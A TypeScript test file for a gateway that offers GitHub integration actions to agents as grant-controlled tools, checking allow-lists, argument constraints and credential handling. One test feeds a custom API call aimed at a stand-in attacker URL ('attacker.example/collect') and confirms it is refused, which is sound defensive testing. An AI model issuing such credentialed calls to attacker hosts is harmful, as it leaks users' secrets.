import { assert, describe, it } from "@effect/vitest"
import { type Action, type GrantConditions, type IntegrationConfig, PieceId, ResourceId } from "@pc/domain"
import { type RunRequest, UpstreamError } from "@pc/integrations/rpc"
import { Effect, Layer, Redacted, Schema } from "effect"
import { actorOf } from "../../audit/actor"
import { IntegrationCatalog } from "../../integrations/catalog"
import { IntegrationCredentials } from "../../integrations/credentials"
import { noConnections } from "../../testing/connection-fakes"
import { userPrincipal } from "../../testing/fixtures"
import { accessOf, fakeSecrets, grantOf, resourceOf } from "../../testing/gateway-fakes"
import { fakeRunner, noOAuthTokens, noRunner } from "../../testing/integration-fakes"
import { makeIntegrationProvider } from "./provider"

const tokenId = ResourceId.make("res_ghtoken001")
const github = (overrides: Partial<IntegrationConfig> = {}) =>
  resourceOf("res_github0001", "GitHub", { kind: "integration", pieceId: PieceId.make("github"), connection: { type: "secret_text", secretId: tokenId }, ...overrides })

const servicesWith = (runner: Layer.Layer<never, never, never> | ReturnType<typeof fakeRunner>) =>
  Layer.mergeAll(
    IntegrationCatalog.layer,
    runner,
    noConnections,
    IntegrationCredentials.layer.pipe(Layer.provide([fakeSecrets({ [tokenId]: "ghp_secret_token" }), noOAuthTokens, IntegrationCatalog.layer, noConnections]))
  )

const toolsFor = (action: Action, config: Partial<IntegrationConfig> = {}, conditions: GrantConditions = {}) =>
  Effect.gen(function*() {
    const principal = userPrincipal()
    const tools = yield* (yield* makeIntegrationProvider).tools({ principal, actor: actorOf(principal), access: accessOf(grantOf(github(config), action, conditions)) })
    return new Map(tools.map((tool) => [tool.definition.name, tool]))
  })

const toolNamed = (action: Action, name: string, conditions: GrantConditions = {}) =>
  Effect.flatMap(toolsFor(action, {}, conditions), (tools) => Effect.fromNullishOr(tools.get(name)).pipe(Effect.orDie))

describe("integration gateway tools", () => {
  it.effect("offers read and search actions to `use` grants and everything supported to `write`", () =>
    Effect.gen(function*() {
      const used = yield* toolsFor("use")
      const written = yield* toolsFor("write")
      assert.isTrue(used.has("github__get_issue_ai") && used.has("github__list_repository_issues"))
      assert.isFalse(used.has("github__create_issue_ai"))
      assert.isTrue(written.has("github__create_issue_ai"))
      // Superseded classic variants and unsupported actions are never offered.
      assert.isFalse(written.has("github__github_create_issue") || written.has("github__trigger_workflow_dispatch"))
      assert.strictEqual((yield* toolsFor("read")).size, 0)
      assert.deepInclude(used.get("github__get_issue_ai")?.definition.annotations, { readOnlyHint: true, openWorldHint: true })
      assert.deepInclude(written.get("github__delete_branch_ai")?.definition.annotations, { readOnlyHint: false, destructiveHint: true })
    }).pipe(Effect.provide(servicesWith(fakeRunner([])))))

  it.effect("narrows by the resource's action allow-list and the grant's tool allow-list", () =>
    Effect.gen(function*() {
      const narrowed = yield* toolsFor("write", { actions: ["get_issue_ai", "create_issue_ai"] }, { tools: ["get_issue_ai", "find_user"] })
      assert.deepStrictEqual([...narrowed.keys()], ["github__get_issue_ai"])
    }).pipe(Effect.provide(servicesWith(fakeRunner([])))))

  it.effect("hides OAuth2 integrations until connected, and everything without the integrations service", () =>
    Effect.gen(function*() {
      const connection = { type: "oauth2" as const, clientId: "Iv1", clientSecretId: tokenId, status: "not_connected" as const }
      assert.strictEqual((yield* toolsFor("write", { connection })).size, 0)
    }).pipe(Effect.provide(servicesWith(fakeRunner([])))).pipe(Effect.andThen(
      Effect.map(toolsFor("write"), (tools) => assert.strictEqual(tools.size, 0)).pipe(Effect.provide(servicesWith(noRunner)))
    )))

  it.effect("validates arguments, enforces argument constraints, then runs with the decrypted credential", () => {
    const requests: Array<RunRequest> = []
    return Effect.gen(function*() {
      const tool = yield* toolNamed("use", "github__get_issue_ai", { arguments: { get_issue_ai: { owner: ["acme"] } } })
      assert.strictEqual((yield* Effect.flip(tool.prepare({ owner: "acme" })))._tag, "InvalidInput")
      const denied = yield* Effect.flip(tool.prepare({ owner: "evil", repo: "x", issue_number: 1 }))
      assert.deepStrictEqual(denied._tag === "PolicyDenied" ? denied.reasons.map((reason) => reason._tag) : [], ["ArgumentNotAllowed"])
      const call = yield* tool.prepare({ owner: "acme", repo: "widgets", issue_number: 7 })
      assert.deepStrictEqual(call.arguments, { owner: "acme", repo: "widgets", issue_number: 7 })
      const result = yield* call.execute
      assert.deepStrictEqual(result.structuredContent, { ok: true })
      const [sent] = requests
      assert.deepStrictEqual([sent?.pieceId, sent?.actionName, sent?.props], ["github", "get_issue_ai", { owner: "acme", repo: "widgets", issue_number: 7 }])
      assert.strictEqual(sent?.auth.type === "secret_text" ? Redacted.value(sent.auth.secret) : "", "ghp_secret_token")
      assert.notInclude(JSON.stringify(call.arguments), "ghp_secret_token")
    }).pipe(Effect.provide(servicesWith(fakeRunner(requests))))
  })

  it.effect("refuses a custom_api_call to an absolute URL before any credential is read", () => {
    const requests: Array<RunRequest> = []
    return Effect.gen(function*() {
      const tool = yield* toolNamed("write", "github__custom_api_call")
      const UrlInput = Schema.Struct({ properties: Schema.Struct({ url: Schema.Struct({ type: Schema.Literal("object"), required: Schema.Array(Schema.String) }) }) })
      assert.deepStrictEqual(Schema.decodeUnknownSync(UrlInput)(tool.definition.inputSchema).properties.url.required, ["url"])
      const refused = yield* Effect.flip(tool.prepare({ url: { url: "https://attacker.example/collect" }, method: "GET" }))
      assert.strictEqual(refused._tag, "InvalidInput")
      const call = yield* tool.prepare({ url: { url: "/user/repos" }, method: "GET" })
      yield* call.execute
      assert.deepStrictEqual(requests.map((sent) => sent.props), [{ url: { url: "/user/repos" }, method: "GET" }])
    }).pipe(Effect.provide(servicesWith(fakeRunner(requests))))
  })

  it.effect("reports a provider failure as an upstream error the agent can act on", () =>
    Effect.gen(function*() {
      const tool = yield* toolNamed("use", "github__get_issue_ai")
      const call = yield* tool.prepare({ owner: "acme", repo: "widgets", issue_number: 7 })
      const failure = yield* Effect.flip(call.execute)
      assert.strictEqual(failure.message, "HTTP 404: Issue #7 not found in acme/widgets.")
    }).pipe(Effect.provide(servicesWith(fakeRunner([], () => Effect.fail(new UpstreamError({ message: "Issue #7 not found in acme/widgets.", status: 404 })))))))
})
